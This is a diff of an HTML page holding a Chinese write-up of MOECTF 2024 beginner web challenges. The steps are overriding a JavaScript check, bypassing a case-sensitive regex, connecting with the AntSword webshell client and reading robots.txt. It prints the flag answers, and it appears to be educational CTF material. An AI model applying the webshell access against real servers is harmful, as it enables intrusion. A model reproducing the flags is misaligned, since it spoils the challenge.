 <h4 id="flag5sxrphp">flag5sxr.php<a class="headerlink" href="#flag5sxrphp" title="Permanent link">¶</a></h4>
-<p>查看源码，<span>js<span class="heti-spacing"> </span></span>脚本，可以发现如果我们输入了<span><span class="heti-spacing"> </span>"I want flag"</span> ，会返回<span><span class="heti-spacing"> </span>false</span>，我们在控制台中<a href="../attachments/WEB-5.png">覆盖调它</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">ef593c4c30c7c22308693d015b892e64</strong>再输入即可<span><span class="heti-spacing"> </span>=&gt; }</span><code>flag5: fSV90aDF</code></p>
+<p>查看源码，<span>js<span class="heti-spacing"> </span></span>脚本，可以发现如果我们输入了<span><span class="heti-spacing"> </span>"I want flag"</span> ，会返回<span><span class="heti-spacing"> </span>false</span>，我们在控制台中<a href="../attachments/WEB-5.png">覆盖调它</a>再输入即可<span><span class="heti-spacing"> </span>=&gt;</span> <code>flag5: fSV90aDF</code></p>
 <h4 id="flag6diwphp">flag6diw.php<a class="headerlink" href="#flag6diwphp" title="Permanent link">¶</a></h4>
 <ul>
 <li><code>if (preg_match('/flag/', $_GET['moe']))</code>：如果<span class="heti-skip"><span class="heti-spacing"> </span>GET<span class="heti-spacing"> </span></span>请求中的<span class="heti-skip"><span class="heti-spacing"> </span><span class="heti-spacing"> </span></span><code>moe</code><span class="heti-skip"><span class="heti-spacing"> </span><span class="heti-spacing"> </span></span>参数的值中包含<span><span class="heti-spacing"> </span>'flag'</span>（区分大小写<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，程序将调用<span class="heti-skip"><span class="heti-spacing"> </span><span class="heti-spacing"> </span></span><code>die("no");</code><span class="heti-skip"><span class="heti-spacing"> </span><span class="heti-spacing"> </span></span>函数，终止执行并输出<span><span class="heti-spacing"> </span>"no"</span>。</li>
 <li><code>elseif (preg_match('/flag/i', $_GET['moe']))</code>：如果<span class="heti-skip"><span class="heti-spacing"> </span><span class="heti-spacing"> </span></span><code>moe</code><span class="heti-skip"><span class="heti-spacing"> </span><span class="heti-spacing"> </span></span>参数的值中包含<span><span class="heti-spacing"> </span>'flag'</span>（不区分大小写<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，则输出<span><span class="heti-spacing"> </span>"flag6: xxx"</span>（其中<span class="heti-skip"><span class="heti-spacing"> </span><span class="heti-spacing"> </span></span><code>xxx</code><span class="heti-skip"><span class="heti-spacing"> </span><span class="heti-spacing"> </span></span>可以是某个实际的值或者其他输出<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>。</li>
 </ul>
-<p><a href="../attachments/WEB-6.png">使用<span class="heti-skip"><span class="heti-spacing"> </span>hackbar<span class="heti-spacing"> </span></span>传参<span><span class="heti-spacing"> </span>FLAG</span></a><span><span class="heti-spacing"> </span>{</span><strong class="hash">23e54fe4ca0842636c7fbdcc1bbc47c2</strong> 即可<span><span class="heti-spacing"> </span>=&gt; }</span><code>flag6: rZV9VX2t</code></p>
+<p><a href="../attachments/WEB-6.png">使用<span class="heti-skip"><span class="heti-spacing"> </span>hackbar<span class="heti-spacing"> </span></span>传参<span class="heti-skip"><span class="heti-spacing"> </span>FLAG<span class="heti-spacing"> </span></span></a>即可<span><span class="heti-spacing"> </span>=&gt;</span> <code>flag6: rZV9VX2t</code></p>
 <h4 id="flag7fxxkfinalphp">flag7fxxkfinal.php<a class="headerlink" href="#flag7fxxkfinalphp" title="Permanent link">¶</a></h4>
-<p>使用蚁剑连接，在<a href="../attachments/WEB-7.png"><span class="heti-skip"><span class="heti-spacing"> </span>/flag7<span class="heti-spacing"> </span></span>中</a><span><span class="heti-spacing"> </span>{</span><strong class="hash">5fee304cca45588cf6902c2af5aea814</strong>找到最后一段<span><span class="heti-spacing"> </span>=&gt; }</span><code>flag7: rbm93X1dlQn0=</code></p>
+<p>使用蚁剑连接，在<a href="../attachments/WEB-7.png"><span class="heti-skip"><span class="heti-spacing"> </span>/flag7<span class="heti-spacing"> </span></span>中</a>找到最后一段<span><span class="heti-spacing"> </span>=&gt;</span> <code>flag7: rbm93X1dlQn0=</code></p>
 <p>拼起来并解<span class="heti-skip"><span class="heti-spacing"> </span>base64<span class="heti-spacing"> </span></span>编码：</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB}</p>
 </div>
 <h3 id="_5">弗拉格之地的入口<a class="headerlink" href="#_5" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
 <p>很显然<heti-adjacent class="heti-adjacent-quarter">，</heti-adjacent>“爬虫” 提示我们查看 <code>robots.txt</code> 文件，继而打开<span><span class="heti-spacing"> </span>webtutorEntry.php</span>，获取<span><span class="heti-spacing"> </span>flag</span>。</p>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
+<div class="admonition flag">
+<p class="admonition-title">Flag</p>
 <p>moectf{CONgRaTUl@tiOn-fOr-Know1nG-RoBoTs_Txtb2cd}</p>
 </div>
-<!--
-  ~ MIT License
-  ~
-  ~ Copyright (c) 2023-2025 Maciej 'maQ' Kusz <maciej.kusz@gmail.com>
-  ~
-  ~ Permission is hereby granted, free of charge, to any person obtaining a copy
-  ~ of this software and associated documentation files (the "Software"), to deal
-  ~ in the Software without restriction, including without limitation the rights
-  ~ to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-  ~ copies of the Software, and to permit persons to whom the Software is
-  ~ furnished to do so, subject to the following conditions:
-  ~
-  ~ The above copyright notice and this permission notice shall be included in all
-  ~ copies or substantial portions of the Software.
-  ~
-  ~ THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-  ~ IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-  ~ FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-  ~ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-  ~ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-  ~ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-  ~ SOFTWARE.
-  -->
-<hr/>
-<!--suppress HtmlUnknownAttribute -->
-<p class="obsidian_backlink_title">Backlinks:</p>
-<div class="obsidian_backlink">
-<details class="backlink">
-<summary>None</summary>
-<p></p><p class="obsidian_backlink">- <a href="https://blog.darstib.cn/CTF/MOECTF2024/#ecca8dd6e85335f38ce0236623a1a554">WEB</a></p>
-</details>
-</div>
+<aside class="md-source-file">
+<span class="md-source-file__fact">
+<span class="md-icon" title="最后更新">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
+</span>
+<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">2024年11月13日</span>
+</span>
+<span class="md-source-file__fact">
+<span class="md-icon" title="创建日期">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg>
+</span>
+<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">2024年10月9日</span>
+</span>
+</aside>
 <form class="md-feedback" hidden="" name="feedback">
 <fieldset>
 <legend class="md-feedback__title">
